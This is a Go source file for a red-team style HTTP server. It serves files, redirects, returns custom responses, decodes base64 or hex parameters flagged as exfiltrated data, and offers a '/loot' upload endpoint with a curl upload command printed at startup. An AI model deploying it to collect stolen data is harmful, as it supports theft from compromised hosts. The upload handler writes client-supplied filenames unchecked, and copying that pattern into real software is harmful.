package goserver

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"strings"
	"unicode"

	"github.com/gorilla/mux"
	"github.com/projectdiscovery/sslcert"
)

// "github.com/caddyserver/certmagic"  << try out certmagic for auto letsencrypt certs

const (
	Reset  = "\033[0m"
	Red    = "\033[31m"
	Green  = "\033[32m"
	Yellow = "\033[33m"
	Blue   = "\033[34m"
	Purple = "\033[35m"
	Cyan   = "\033[36m"
	Gray   = "\033[37m"
	White  = "\033[97m"
)

type HTTPConfig struct {
	Dump            bool
	WorkDir         string
	DoAuth          bool
	Username        string
	Password        string
	RedirectURL     string
	Addr            string
	Port            string
	SSL             bool
	SSLCert         string
	SSLKey          string
	SSLDomain       string
	Headers         map[string]string
	CustomResponses map[string]string
	JSONDoLog       bool
	JSONLogFile     string
	
}

var HttpCfg HTTPConfig

func CheckAuth(r *http.Request) bool {
	if !HttpCfg.DoAuth {
		return true
	}

	u, p, ok := r.BasicAuth()
	if !ok {
		return false
	}
	if u != HttpCfg.Username {
		return false
	}
	if p != HttpCfg.Password {
		return false
	}
	return true
}

func DropLoot(w http.ResponseWriter, r *http.Request) {
	auth := CheckAuth(r)
	DumpReq(w, r, auth)
	LogRequest(r)
	if !auth {
		return
	}

	r.ParseMultipartForm(10 << 20)

	file, handler, err := r.FormFile("file")
	if err != nil {
		fmt.Println(Red+"[ERROR] Retrieving the File", Reset)
		fmt.Println(err)
		return
	}
	defer file.Close()

	fileBytes, err := ioutil.ReadAll(file)
	if err != nil {
		fmt.Println(err)
	}

	err = ioutil.WriteFile(HttpCfg.WorkDir+"/"+handler.Filename, fileBytes, 0644)
	if err != nil {
		fmt.Println(Red+"[ERROR] Failed to write local file:", HttpCfg.WorkDir+"/"+handler.Filename, Reset)
		return
	}
	fmt.Println(Green+"[+] Uploaded File:", handler.Filename, Reset)
}

func DumpReq(w http.ResponseWriter, req *http.Request, auth bool) {
	authmsg := ""
	if HttpCfg.DoAuth {
		if auth {
			authmsg = Green + "(Auth Valid)" + Reset
		} else {
			authmsg = Red + "(Auth Failed)" + Reset
		}

	}
	exmsg := ""
	exfil := parseExfil(req)
	log.Println(req.Method, "from", req.RemoteAddr+":", req.URL.Path, authmsg, exmsg)
	if len(exfil) > 0 {
		tmp := []string{}
		for k, v := range exfil {
			tmp = append(tmp, k+"="+strings.TrimRight(v, "\n"))
		}
		fmt.Printf("     └─ Exfil data detected: %s\n", strings.Join(tmp, ",")) // ├  <<< if we need it.
	}
	if HttpCfg.Dump {
		qp := ""
		query := parseParams(req.URL.RawQuery)

		if len(req.URL.RawQuery) > 0 {
			qp = "?" + query
		}

		// fmt.Println(req.Method + " " + req.URL.Path + qp + " " + req.Proto)

		body, err := ioutil.ReadAll(req.Body)

		if err != nil {
			log.Println(Red+"[ERROR] reading body:", err, Reset)
			return
		}

		// fmt.Println()
		// fmt.Println()

		fmt.Println(Cyan + "-------------------------------------- Request --------------------------------------")

		fmt.Println(req.Method + " " + req.URL.Path + qp + " " + req.Proto)
		fmt.Println("Host: " + req.Host)
		for k := range req.Header {
			fmt.Println(k + ": " + req.Header.Get(k))
		}
		fmt.Printf("\n\n")
		tmpBody := parseParams(string(body))

		fmt.Println(tmpBody)
		req.Body.Close() //  must close
		req.Body = ioutil.NopCloser(bytes.NewBuffer(body))
		fmt.Println("-------------------------------------------------------------------------------------", Reset)

	}

}

// parseExfil returns a map of any GET/POST params that successfully decode from hex or base64.
func parseExfil(req *http.Request) map[string]string {
	ret := make(map[string]string)
	data := req.URL.RawQuery
	body, err := ioutil.ReadAll(req.Body)
	if err == nil {
		if len(data) > 0 {
			data = "&" + data
		}
		data += string(body)
	}
	req.Body = ioutil.NopCloser(bytes.NewBuffer(body))
	parts := strings.Split(data, "&")
	if len(parts) > 0 {
		for _, set := range parts {
			setparts := strings.SplitN(set, "=", 2)
			if len(setparts) < 2 {
				continue
			}
			decodeddata := urlDecode(setparts[1])
			trydecode := decodeHexOrBase64(decodeddata)
			if trydecode != setparts[1] {
				data = strings.Replace(data, setparts[1], trydecode, 1)
				ret[setparts[0]] = trydecode
			}
		}
	}
	return ret

}

// parseParams handles replaceing hex or base64 decoded data in a dump.
func parseParams(data string) string {
	parts := strings.Split(data, "&")
	if len(parts) > 0 {
		for _, set := range parts {
			setparts := strings.SplitN(set, "=", 2)
			if len(setparts) < 2 {
				continue
			}
			decodeddata := urlDecode(setparts[1])
			trydecode := strings.TrimRight(decodeHexOrBase64(decodeddata), "\n")
			if trydecode != setparts[1] {
				data = strings.Replace(data, setparts[1], trydecode, 1)
			}
		}
	}
	return data
}

func urlDecode(encodedValue string) string {
	var err error
	decodedValue := encodedValue

	decodedValue, err = url.QueryUnescape(encodedValue)
	if err != nil {
		return encodedValue
	}
	return decodedValue
}
func b64Decode(encodedValue string) string {
	data, err := base64.StdEncoding.DecodeString(encodedValue)
	if err != nil {
		return encodedValue
	}
	return string(data)
}
func decodeHexOrBase64(content string) string {
	result := content
	dat := []byte(content)
	isHex := true
	for _, v := range dat {
		if v >= 48 && v <= 57 || v >= 65 && v <= 70 || v >= 97 && v <= 102 {
			// isHex = true
		} else {
			isHex = false
			break
		}
	}
	if isHex {
		if strings.HasPrefix(content, "0x") {
			strings.Replace(content, "0x", "", 1)
		}

		d, err := hex.DecodeString(content)
		if err == nil {
			result = string(d)
		}

	} else {
		r, _ := base64.StdEncoding.DecodeString(content)
		result = string(r)
	}

	if isASCII(result) {
		return result
	}
	return content

}

func isASCII(s string) bool {
	for i := 0; i < len(s); i++ {
		if s[i] > unicode.MaxASCII {
			return false
		}
	}
	return true
}
func ServeFiles(h http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		auth := CheckAuth(r)
		DumpReq(w, r, auth)
		LogRequest(r)
		if !auth {
			return
		}
		for k, v := range HttpCfg.Headers {
			w.Header().Add(k, v)
		}

		h.ServeHTTP(w, r) // call original
	})
}

func ServeRedir(w http.ResponseWriter, r *http.Request) {
	auth := CheckAuth(r)
	DumpReq(w, r, auth)
	LogRequest(r)
	http.Redirect(w, r, HttpCfg.RedirectURL, http.StatusSeeOther)
}

func ServeCustom(w http.ResponseWriter, r *http.Request) {
	auth := CheckAuth(r)
	DumpReq(w, r, auth)
	LogRequest(r)
	log.Println("Request for", r.URL.Path, "reading response from:", HttpCfg.CustomResponses[r.URL.Path])
	f, err := ioutil.ReadFile(HttpCfg.CustomResponses[r.URL.Path])
	if err != nil {
		log.Fatal("err")
	}

	prts := strings.SplitN(string(f), "\n\n", 2)
	for _, h := range strings.Split(prts[0], "\n") {
		if strings.HasPrefix(h, "HTTP") {
			continue
		}
		tmp := strings.Replace(h, ": ", ":", -1)
		kv := strings.SplitN(tmp, ":", 2)
		w.Header().Set(strings.ToLower(kv[0]), kv[1])
		//
	}
	w.Header().Set("content-length", fmt.Sprintf("%d", len(prts[1])))
	w.WriteHeader(200)       // write status code
	w.Write([]byte(prts[1])) // write body
}

func ListURLs(addr, port string, ssl bool) {
	scheme := "http"
	if ssl {
		scheme = "https"
	}
	fmt.Println(Blue+"[!] Starting web server at:", Reset)
	if addr != "" {
		fmt.Println(Yellow+"     "+scheme+"://"+addr+":"+port, Reset)
	} else {
		ip, err := net.InterfaceAddrs()
		if err == nil {
			for _, v := range ip {
				fmt.Println(Yellow+"     "+scheme+"://"+strings.Split(v.String(), "/")[0]+":"+port, Reset)

			}
		}
	}
	fmt.Println()
}

func Run() {
	fmt.Println(Blue + "[!] Upload URI: /loot (curl -F \"file=@./file.txt\" http[s]://address:port/loot)" + Reset)
	fmt.Println(Blue + "[!] Special Params: base64 (GET/POST)" + Reset)
	fmt.Println(Blue+"[!] Dump Requests:", HttpCfg.Dump, Reset)
	fmt.Println(Blue+"[!] Auth Enabled:", HttpCfg.DoAuth, Reset)
	fmt.Println(Blue+"[!] Working Directory:", HttpCfg.WorkDir, Reset)
	fmt.Println(Blue+"[!] SSL Enabled:", HttpCfg.SSL, Reset)
	ListURLs(HttpCfg.Addr, HttpCfg.Port, HttpCfg.SSL)

	http.HandleFunc("/loot", DropLoot)
	if HttpCfg.RedirectURL == "" {
		http.Handle("/", ServeFiles(http.FileServer(http.Dir(HttpCfg.WorkDir))))
	} else {
		http.HandleFunc("/", ServeRedir)
	}

	if len(HttpCfg.CustomResponses) > 0 {
		for k, _ := range HttpCfg.CustomResponses {
			http.HandleFunc(k, ServeCustom)
		}
	}

	r := mux.NewRouter()
	r.HandleFunc("/loot", DropLoot)
	if HttpCfg.RedirectURL == "" {
		r.Handle("/", ServeFiles(http.FileServer(http.Dir(HttpCfg.WorkDir))))
	} else {
		r.HandleFunc("/", ServeRedir)
	}
	if len(HttpCfg.CustomResponses) > 0 {
		for k, _ := range HttpCfg.CustomResponses {
			r.HandleFunc(k, ServeCustom)
		}
	}
	// http.Handle("/", r)

	if HttpCfg.SSL {
		if HttpCfg.SSLCert == "" || HttpCfg.SSLKey == "" {
			tlsOptions := sslcert.DefaultOptions
			tlsOptions.Host = HttpCfg.SSLDomain
			tlsConfig, err := sslcert.NewTLSConfig(tlsOptions)
			if err != nil {
				log.Fatal(err)
			}
			server := &http.Server{
				Addr:      HttpCfg.Addr + ":" + HttpCfg.Port,
				TLSConfig: tlsConfig,
				Handler:   r,
			}

			err = server.ListenAndServeTLS("", "")
			if err != nil {
				log.Fatal("ListenAndServeTLS: ", err)
			}
		} else {
			err := http.ListenAndServeTLS(HttpCfg.Addr+":"+HttpCfg.Port, HttpCfg.SSLCert, HttpCfg.SSLKey, r)
			if err != nil {
				log.Fatal("ListenAndServeTLS: ", err)
			}
		}
	} else {
		err := http.ListenAndServe(HttpCfg.Addr+":"+HttpCfg.Port, r)
		if err != nil {
			log.Fatal("ListenAndServe: ", err)
		}
	}
}
